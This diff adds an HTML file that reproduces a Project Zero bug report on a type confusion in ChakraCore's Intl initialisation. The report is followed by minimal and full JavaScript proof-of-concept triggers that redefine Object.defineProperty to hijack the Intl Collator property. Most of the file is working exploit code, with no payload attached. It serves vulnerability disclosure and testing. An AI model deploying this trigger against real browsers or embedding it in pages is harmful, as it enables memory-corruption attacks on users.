@@ -1,0 +1,64 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=972
+
+In Chakra, Internationlization is initialized the first time the Intl object is used, by executing the script in Intl.js (https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/InJavascript/Intl.js). This code attempts to prevent Object methods from being redefined by user scripts, but there are a few stray calls to Object.defineProperty in initialization. If Object.defineProperty is redefined before Intl is initialized, a user-define method can be called during initialization. If this method defines a Collator (or DateTimeFormat or NumberFormat) getter and setter on the Intl object, it can intercept what it is set to, and set it to a different value instead. This will then cause type confusion in IntlEngineInterfaceExtensionObject::deletePrototypePropertyHelper (https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/IntlEngineInterfaceExtensionObject.cpp), as this function assumes the properties of a Collator are objects, when they are not guaranteed to be. A minimal PoC is as follows, and a full PoC is attached.
+ 
+
+var d = Object.defineProperty;
+
+var noobj = {
+    get: function () {
+        return 0x1234567 >> 1;
+    },
+    set: function () {
+    }
+};
+
+function f(){
+	var i = Intl;
+	Intl  = {}; // this somehow prevents an exception that prevents laoding
+	d(i, "Collator", noobj);
+}
+
+
+Object.defineProperty = f;
+
+var q = new Intl.NumberFormat(["en"]);
+
+</script></body></html>
+-->
+
+<html><body><script>
+
+var d = Object.defineProperty;
+
+var noobj = {
+    get: function () {
+	print("in get no");
+        return 0x1234567 >> 1;
+    },
+    set: function () {
+        print("in set no");
+    }
+};
+
+function f(...a){
+	var i = Intl;
+	Intl  = {};
+	d(i, "Collator", noobj);
+	
+}
+
+var pattern = {
+    get: function () {
+        return f;
+    },
+    set: function () {
+    }
+};
+
+Object.defineProperty(Object, "defineProperty", pattern);
+
+var q = new Intl.NumberFormat(["en"]);
+
+</script></body></html>
